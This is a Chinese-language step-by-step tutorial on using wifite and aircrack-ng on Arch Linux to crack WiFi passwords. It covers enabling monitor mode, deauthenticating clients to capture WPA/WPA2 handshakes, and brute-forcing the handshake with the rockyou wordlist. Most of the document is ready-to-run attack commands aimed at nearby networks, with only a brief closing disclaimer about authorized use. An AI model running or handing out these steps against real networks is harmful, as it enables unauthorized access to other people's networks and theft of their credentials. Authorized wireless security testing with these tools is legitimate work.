# 🧨 使用 Wifite 从攻击到获取 WiFi 密码的完整流程（Arch Linux）

---

## 🧰 一、所需工具准备

确保系统中安装以下工具：

- `wifite`：自动化攻击脚本
- `aircrack-ng`：破解握手包
- `rockyou.txt`：常用密码字典

### ✅ 安装命令：

```bash
sudo pacman -S wifite aircrack-ng wordlists wireshark-cli reaver
zcat /usr/share/wordlists/rockyou.txt.gz > ~/rockyou.txt
```

---

## 📡 二、启用无线网卡监控模式

```bash
sudo airmon-ng start wlan0
```

> 注意替换 `wlan0` 为你实际的无线接口，如 `wlo1`，使用 `ip a` 查看接口名称。

---

## 🚀 三、启动 Wifite 进行攻击与握手捕获

使用以下命令启动 Wifite 并自动杀掉干扰进程：

```bash
sudo wifite --kill
```

### 🎯 操作步骤：

1. 程序开始扫描周围 WiFi 网络，等待几秒。
2. 使用方向键选择目标（建议信号 > 60 dBm）。
3. 按回车，Wifite 会：
   - 攻击客户端以促使握手发生
   - 捕获 WPA/WPA2 握手包
   - 存储握手包于 `~/hs/` 目录

---

## 🔓 四、使用 aircrack-ng 破解握手包密码

找到 `.cap` 文件：

```bash
ls ~/hs
```

执行破解命令：

```bash
aircrack-ng -w ~/rockyou.txt -b <BSSID> ~/hs/<handshake>.cap
```

> `<BSSID>` 可选，增加速度；可从 `wifite` 扫描界面中复制。

### 示例：

```bash
aircrack-ng -w ~/rockyou.txt ~/hs/handshake-wifi-123.cap
```

## 📁 五、文件位置说明

| 文件/目录           | 说明       |
| --------------- | -------- |
| `~/hs/*.cap`    | 抓取到的握手包  |
| `~/rockyou.txt` | 密码字典文件   |
| `wifite.log`    | 扫描日志（可选） |

---

## 🛑 六、关闭监控模式

```bash
sudo airmon-ng stop wlan0mon
```

---

## ⚠️ 法律免责声明

> 本教程仅供**网络安全测试和学习目的**，请仅在**你拥有或得到明确授权**的网络上执行。  
> 未经授权破解他人 WiFi 网络属于**违法行为**！

---

## 📚 附加资源

- [wifite2 GitHub](https://github.com/kimocoder/wifite2)
- [aircrack-ng 官网](https://www.aircrack-ng.org/)
- [rockyou.txt 字典介绍](https://github.com/danielmiessler/SecLists)

